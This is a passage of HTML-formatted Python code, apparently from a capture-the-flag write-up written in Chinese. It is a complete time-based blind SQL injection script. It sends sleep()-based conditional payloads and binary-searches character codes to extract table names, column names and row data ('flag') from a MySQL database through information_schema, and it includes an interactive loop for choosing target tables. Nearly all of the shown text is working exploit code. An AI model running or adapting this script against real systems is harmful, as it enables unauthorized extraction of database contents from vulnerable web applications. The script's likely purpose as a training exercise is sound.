        <span class="token keyword">try</span><span class="token punctuation">:</span>
            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url <span class="token operator">+</span> quote<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
            num <span class="token operator">+=</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"payload:"</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"数据库中有"</span><span class="token punctuation">,</span> num<span class="token punctuation">,</span> <span class="token string">"个表"</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">return</span> num

<span class="token keyword">def</span> <span class="token function">get_table_length</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> database<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> base_url<span class="token punctuation">,</span> headers
    length <span class="token operator">=</span> <span class="token number">1</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token string">"1 and if((select length(table_name) from information_schema.tables where table_schema = '"</span> <span class="token operator">+</span> database <span class="token operator">+</span> <span class="token string">"' limit "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1) = "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1, sleep(2))"</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url <span class="token operator">+</span> quote<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"table length"</span><span class="token punctuation">,</span> length<span class="token punctuation">,</span> <span class="token string">"failed!"</span><span class="token punctuation">)</span>
            length<span class="token operator">+=</span><span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"table length"</span><span class="token punctuation">,</span> length<span class="token punctuation">,</span> <span class="token string">"success"</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"payload:"</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"数据表名的长度为"</span><span class="token punctuation">,</span> length<span class="token punctuation">)</span>
    <span class="token keyword">return</span> length

<span class="token keyword">def</span> <span class="token function">get_table</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> table_length<span class="token punctuation">,</span> database<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> base_url<span class="token punctuation">,</span> headers
    table <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> table_length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        l<span class="token punctuation">,</span> r <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">127</span> <span class="token comment">#神奇的申明方法</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token builtin">ascii</span> <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
            id_equal <span class="token operator">=</span> <span class="token string">"1 and if((select ascii(substr(table_name, "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1)) from information_schema.tables where table_schema = '"</span> <span class="token operator">+</span> database <span class="token operator">+</span> <span class="token string">"' limit "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",1) = "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1, sleep(2))"</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url <span class="token operator">+</span> quote<span class="token punctuation">(</span>id_equal<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
            <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
                id_bigger <span class="token operator">=</span> <span class="token string">"1 and if((select ascii(substr(table_name, "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1)) from information_schema.tables where table_schema = '"</span> <span class="token operator">+</span> database <span class="token operator">+</span> <span class="token string">"' limit "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",1) > "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1, sleep(2))"</span>
                <span class="token keyword">try</span><span class="token punctuation">:</span>
                    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url <span class="token operator">+</span> quote<span class="token punctuation">(</span>id_bigger<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
                <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
                    r <span class="token operator">=</span> <span class="token builtin">ascii</span> <span class="token operator">-</span> <span class="token number">1</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    l <span class="token operator">=</span> <span class="token builtin">ascii</span> <span class="token operator">+</span> <span class="token number">1</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                table <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">)</span>
                <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"目前已知数据库名"</span><span class="token punctuation">,</span> table<span class="token punctuation">)</span>
                <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"数据表名为"</span><span class="token punctuation">,</span> table<span class="token punctuation">)</span>
    <span class="token keyword">return</span> table

<span class="token keyword">def</span> <span class="token function">get_column_num</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> base_url<span class="token punctuation">,</span> headers
    num <span class="token operator">=</span> <span class="token number">1</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token string">"1 and if((select count(column_name) from information_schema.columns where table_name = '"</span> <span class="token operator">+</span> table <span class="token operator">+</span> <span class="token string">"') = "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1, sleep(2))"</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url <span class="token operator">+</span> quote<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
            num <span class="token operator">+=</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"payload:"</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"数据表"</span><span class="token punctuation">,</span> table<span class="token punctuation">,</span> <span class="token string">"中有"</span><span class="token punctuation">,</span> num<span class="token punctuation">,</span> <span class="token string">"个字段"</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">return</span> num

<span class="token keyword">def</span> <span class="token function">get_column_length</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> table<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> base_url<span class="token punctuation">,</span> headers
    length <span class="token operator">=</span> <span class="token number">1</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token string">"1 and if((select length(column_name) from information_schema.columns where table_name = '"</span> <span class="token operator">+</span> table <span class="token operator">+</span> <span class="token string">"' limit "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1) = "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1, sleep(2))"</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url <span class="token operator">+</span> quote<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"column length"</span><span class="token punctuation">,</span> length<span class="token punctuation">,</span> <span class="token string">"failed!"</span><span class="token punctuation">)</span>
            length<span class="token operator">+=</span><span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"column length"</span><span class="token punctuation">,</span> length<span class="token punctuation">,</span> <span class="token string">"success"</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"payload:"</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"数据表"</span><span class="token punctuation">,</span> table<span class="token punctuation">,</span> <span class="token string">"第"</span><span class="token punctuation">,</span> index<span class="token punctuation">,</span> <span class="token string">"个字段的长度为"</span><span class="token punctuation">,</span> length<span class="token punctuation">)</span>
    <span class="token keyword">return</span> length

<span class="token keyword">def</span> <span class="token function">get_column</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> column_length<span class="token punctuation">,</span> table<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> base_url<span class="token punctuation">,</span> headers
    column <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> column_length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        l<span class="token punctuation">,</span> r <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">127</span> <span class="token comment">#神奇的申明方法</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token builtin">ascii</span> <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
            id_equal <span class="token operator">=</span> <span class="token string">"1 and if((select ascii(substr(column_name, "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1)) from information_schema.columns where table_name = '"</span> <span class="token operator">+</span> table <span class="token operator">+</span> <span class="token string">"' limit "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",1) = "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1, sleep(2))"</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url <span class="token operator">+</span> quote<span class="token punctuation">(</span>id_equal<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
            <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
                id_bigger <span class="token operator">=</span> <span class="token string">"1 and if((select ascii(substr(column_name, "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1)) from information_schema.columns where table_name = '"</span> <span class="token operator">+</span> table <span class="token operator">+</span> <span class="token string">"' limit "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",1) > "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1, sleep(2))"</span>
                <span class="token keyword">try</span><span class="token punctuation">:</span>
                    requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url <span class="token operator">+</span> quote<span class="token punctuation">(</span>id_bigger<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
                <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
                    r <span class="token operator">=</span> <span class="token builtin">ascii</span> <span class="token operator">-</span> <span class="token number">1</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    l <span class="token operator">=</span> <span class="token builtin">ascii</span> <span class="token operator">+</span> <span class="token number">1</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                column <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">)</span>
                <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"目前已知字段为"</span><span class="token punctuation">,</span> column<span class="token punctuation">)</span>
                <span class="token keyword">break</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"数据表"</span><span class="token punctuation">,</span> table<span class="token punctuation">,</span> <span class="token string">"第"</span><span class="token punctuation">,</span> index<span class="token punctuation">,</span> <span class="token string">"个字段名为"</span><span class="token punctuation">,</span> column<span class="token punctuation">)</span>
    <span class="token keyword">return</span> column

<span class="token keyword">def</span> <span class="token function">get_flag_num</span><span class="token punctuation">(</span>column<span class="token punctuation">,</span> table<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> base_url<span class="token punctuation">,</span> headers
    num <span class="token operator">=</span> <span class="token number">1</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token string">"1 and if((select count("</span> <span class="token operator">+</span> column <span class="token operator">+</span> <span class="token string">") from "</span> <span class="token operator">+</span> table <span class="token operator">+</span> <span class="token string">") = "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1, sleep(2))"</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url <span class="token operator">+</span> quote<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
            num <span class="token operator">+=</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"payload:"</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"数据表"</span><span class="token punctuation">,</span> table<span class="token punctuation">,</span> <span class="token string">"中有"</span><span class="token punctuation">,</span> num<span class="token punctuation">,</span> <span class="token string">"行数据"</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">return</span> num

<span class="token keyword">def</span> <span class="token function">get_flag_length</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> column<span class="token punctuation">,</span> table<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> base_url<span class="token punctuation">,</span> headers
    length <span class="token operator">=</span> <span class="token number">1</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token string">"1 and if((select length("</span> <span class="token operator">+</span> column <span class="token operator">+</span> <span class="token string">") from "</span> <span class="token operator">+</span> table <span class="token operator">+</span> <span class="token string">" limit "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1) = "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1, sleep(2))"</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url <span class="token operator">+</span> quote<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag length"</span><span class="token punctuation">,</span> length<span class="token punctuation">,</span> <span class="token string">"failed!"</span><span class="token punctuation">)</span>
            length<span class="token operator">+=</span><span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag length"</span><span class="token punctuation">,</span> length<span class="token punctuation">,</span> <span class="token string">"success"</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"payload:"</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"数据表"</span><span class="token punctuation">,</span> table<span class="token punctuation">,</span> <span class="token string">"第"</span><span class="token punctuation">,</span> index<span class="token punctuation">,</span> <span class="token string">"行数据的长度为"</span><span class="token punctuation">,</span> length<span class="token punctuation">)</span>
    <span class="token keyword">return</span> length

<span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> flag_length<span class="token punctuation">,</span> column<span class="token punctuation">,</span> table<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> base_url<span class="token punctuation">,</span> headers
    flag <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> flag_length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        l<span class="token punctuation">,</span> r <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">127</span> <span class="token comment">#神奇的申明方法</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token builtin">ascii</span> <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
            id_equal <span class="token operator">=</span> <span class="token string">"1 and if((select ascii(substr("</span> <span class="token operator">+</span> column <span class="token operator">+</span> <span class="token string">", "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1)) from "</span> <span class="token operator">+</span> table <span class="token operator">+</span> <span class="token string">" limit "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",1) = "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1, sleep(2))"</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url <span class="token operator">+</span> quote<span class="token punctuation">(</span>id_equal<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
            <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
                id_bigger <span class="token operator">=</span> <span class="token string">"1 and if((select ascii(substr("</span> <span class="token operator">+</span> column <span class="token operator">+</span> <span class="token string">", "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1)) from "</span> <span class="token operator">+</span> table <span class="token operator">+</span> <span class="token string">" limit "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",1) > "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", 1, sleep(2))"</span>
                <span class="token keyword">try</span><span class="token punctuation">:</span>
                    requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url <span class="token operator">+</span> quote<span class="token punctuation">(</span>id_bigger<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
                <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
                    r <span class="token operator">=</span> <span class="token builtin">ascii</span> <span class="token operator">-</span> <span class="token number">1</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    l <span class="token operator">=</span> <span class="token builtin">ascii</span> <span class="token operator">+</span> <span class="token number">1</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">)</span>
                <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"目前已知flag为"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span>
                <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"数据表"</span><span class="token punctuation">,</span> table<span class="token punctuation">,</span> <span class="token string">"第"</span><span class="token punctuation">,</span> index<span class="token punctuation">,</span> <span class="token string">"行数据为"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span>
    <span class="token keyword">return</span> flag

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"---------------------"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"开始获取数据库名长度"</span><span class="token punctuation">)</span>
    database_length <span class="token operator">=</span> get_database_length<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"---------------------"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"开始获取数据库名"</span><span class="token punctuation">)</span>
    database <span class="token operator">=</span> get_database<span class="token punctuation">(</span>database_length<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"---------------------"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"开始获取数据表的个数"</span><span class="token punctuation">)</span>
    table_num <span class="token operator">=</span> get_table_num<span class="token punctuation">(</span>database<span class="token punctuation">)</span>
    tables <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"---------------------"</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> table_num<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"开始获取第"</span><span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"个数据表的名称的长度"</span><span class="token punctuation">)</span>
        table_length <span class="token operator">=</span> get_table_length<span class="token punctuation">(</span>i<span class="token punctuation">,</span> database<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"---------------------"</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"开始获取第"</span><span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"个数据表的名称"</span><span class="token punctuation">)</span>
        table <span class="token operator">=</span> get_table<span class="token punctuation">(</span>i<span class="token punctuation">,</span> table_length<span class="token punctuation">,</span> database<span class="token punctuation">)</span>
        tables<span class="token punctuation">.</span>append<span class="token punctuation">(</span>table<span class="token punctuation">)</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#在这个循环中可以进入所有的数据表一探究竟</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"---------------------"</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"现在得到了以下数据表"</span><span class="token punctuation">,</span> tables<span class="token punctuation">)</span>
        table <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请在这些数据表中选择一个目标: "</span><span class="token punctuation">)</span>
        <span class="token keyword">while</span><span class="token punctuation">(</span> table <span class="token keyword">not</span> <span class="token keyword">in</span> tables <span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"你输入有误"</span><span class="token punctuation">)</span>
            table <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请重新选择一个目标"</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"---------------------"</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"选择成功，开始获取数据表"</span><span class="token punctuation">,</span> table<span class="token punctuation">,</span> <span class="token string">"的字段数量"</span><span class="token punctuation">)</span>
        column_num <span class="token operator">=</span> get_column_num<span class="token punctuation">(</span>table<span class="token punctuation">)</span>
        columns <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"---------------------"</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> column_num<span class="token punctuation">)</span><span class="token punctuation">:</span>
